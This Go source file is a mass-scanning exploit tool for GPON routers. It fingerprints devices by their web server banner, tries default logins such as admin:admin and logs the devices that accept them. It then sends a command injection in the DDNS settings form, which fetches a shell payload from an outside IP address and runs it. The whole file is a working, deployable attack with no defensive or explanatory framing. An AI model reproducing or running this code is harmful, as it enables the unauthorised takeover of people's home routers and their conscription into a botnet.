/*
9/7/2023 old asf most are shit now
*/

package main

import (
	"bufio"
	"fmt"
	"math/rand"
	"net"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

var (
	file, err = os.OpenFile("gpon.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
)

var syncWait sync.WaitGroup
var statusLogins, statusAttempted, statusFound int
var loginsString = []string{"admin:admin", "user:user"}

func zeroByte(a []byte) {
	for i := range a {
		a[i] = 0
	}
}

func sendExploit(target string) int {

	conn, err := net.DialTimeout("tcp", target, 60*time.Second)
	if err != nil {
		return -1
	}

	conn.SetWriteDeadline(time.Now().Add(60 * time.Second))
	conn.Write([]byte("POST /goform/ddnsCfg HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-GB,en;q=0.5\r\nCache-Control: max-age=0\r\nContent-Length: 188\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: loginName=admin\r\nOrigin: http://" + target + "\r\nProxy-Authorization: Basic bDlhNDVyM3QtcXBzN2t2OTozendyODRxdmE3\r\nReferer: http://" + target + "/application/ddns.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\nddns_username=a&ddns_password=a&ddns_host=%24%28cd+%2Ftmp%3Bwget+http%3A%2F%2F95.214.27.10%2Fgpon+-O-%7Csh%29&ddns_interface=INTERNET_R_VID_99&ddns_provider=0&ddns_domain=&ddns_server=&ddns_protocol=2&Server_url=&button=Apply\r\n\r\n"))
	conn.SetReadDeadline(time.Now().Add(60 * time.Second))

	bytebuf := make([]byte, 512)
	l, err := conn.Read(bytebuf)
	if err != nil || l <= 0 {
		conn.Close()
		return -1
	}

	return -1
}

func sendLogin(target string) int {

	var isLoggedIn int = 0
	var cntLen int

	for x := 0; x < len(loginsString); x++ {
		loginSplit := strings.Split(loginsString[x], ":")

		conn, err := net.DialTimeout("tcp", target, 60*time.Second)
		if err != nil {
			return -1
		}

		cntLen = 13
		cntLen += len(loginSplit[0])
		cntLen += len(loginSplit[1])

		conn.SetWriteDeadline(time.Now().Add(60 * time.Second))
	        conn.Write([]byte("POST /goform/webLogin HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-GB,en;q=0.5\r\nCache-Control: max-age=0\r\nContent-Length: " + strconv.Itoa(cntLen) + "\r\nContent-Type: application/x-www-form-urlencoded\r\nOrigin: http://" + target + "\r\nProxy-Authorization: Basic bDlhNDVyM3QtcXBzN2t2OTozendyODRxdmE3\r\nReferer: http://" + target + "/login_inter.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\nUser=" + loginSplit[0] + "&Passwd=" + loginSplit[1] + "\r\n\r\n"))
		conn.SetReadDeadline(time.Now().Add(60 * time.Second))

		bytebuf := make([]byte, 512)
		l, err := conn.Read(bytebuf)
                //fmt.Println(string(bytebuf))
		if err != nil || l <= 0 {
			conn.Close()
			return -1
		}

		if strings.Contains(string(bytebuf), "HTTP/1.0 302 Redirect") {
			isLoggedIn = 1
		}

		zeroByte(bytebuf)

		if isLoggedIn == 0 {
			conn.Close()
			continue
		}

		fmt.Printf("%s (%s)\r\n", target, loginsString[x])

		file.WriteString(target + "\r\n")

		statusLogins++
		conn.Close()
		break
	}

	if isLoggedIn == 1 {
		return 1
	} else {
		return -1
	}
}

func checkDevice(target string, timeout time.Duration) int {

	var isGpon int = 0

	conn, err := net.DialTimeout("tcp", target, timeout*time.Second)
	if err != nil {
		return -1
	}
	conn.SetWriteDeadline(time.Now().Add(timeout * time.Second))
	conn.Write([]byte("POST /goform/webLogin HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-GB,en;q=0.5\r\nCache-Control: max-age=0\r\nContent-Length: 28\r\nContent-Type: application/x-www-form-urlencoded\r\nOrigin: http://" + target + "\r\nProxy-Authorization: Basic bDlhNDVyM3QtcXBzN2t2OTozendyODRxdmE3\r\nReferer: http://" + target + "/login_inter.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\nUser=admin&Passwd=Feefifofum\r\n\r\n"))
	conn.SetReadDeadline(time.Now().Add(timeout * time.Second))

	bytebuf := make([]byte, 512)
	l, err := conn.Read(bytebuf)
        //fmt.Println(string(bytebuf))
	if err != nil || l <= 0 {
		conn.Close()
		return -1
	}

	if strings.Contains(string(bytebuf), "Server: GoAhead-Webs/2.5.0 PeerSec-MatrixSSL/3.4.2-OPEN") {
		statusFound++
		isGpon = 1
	}
	zeroByte(bytebuf)

	if isGpon == 0 {
		conn.Close()
		return -1
	}

	conn.Close()
	return 1
}

func processTarget(target string, rtarget string) {

	defer syncWait.Done()

	if checkDevice(target, 30) == 1 {
		sendLogin(target)
		sendExploit(target)
		return
	} else {
		return
	}
}

func main() {
	max, _ := strconv.Atoi(os.Args[2])

	rand.Seed(time.Now().UTC().UnixNano())
	var i int = 0
	go func() {
		for {
			fmt.Printf("%d's | Total: %d, Found: %d, Logins: %d\r\n", i, statusAttempted, statusFound, statusLogins)
			time.Sleep(1 * time.Second)
			i++
		}
	}()

	for {
		r := bufio.NewReader(os.Stdin)
		scan := bufio.NewScanner(r)
		for scan.Scan() {
			for runtime.NumGoroutine() > max {
				time.Sleep(1 * time.Second)
			}

			if os.Args[1] != "manual" {
				go processTarget(scan.Text()+":"+os.Args[1], scan.Text())
			} else {
				go processTarget(scan.Text(), scan.Text())
			}
			statusAttempted++
			syncWait.Add(1)
		}
	}
}
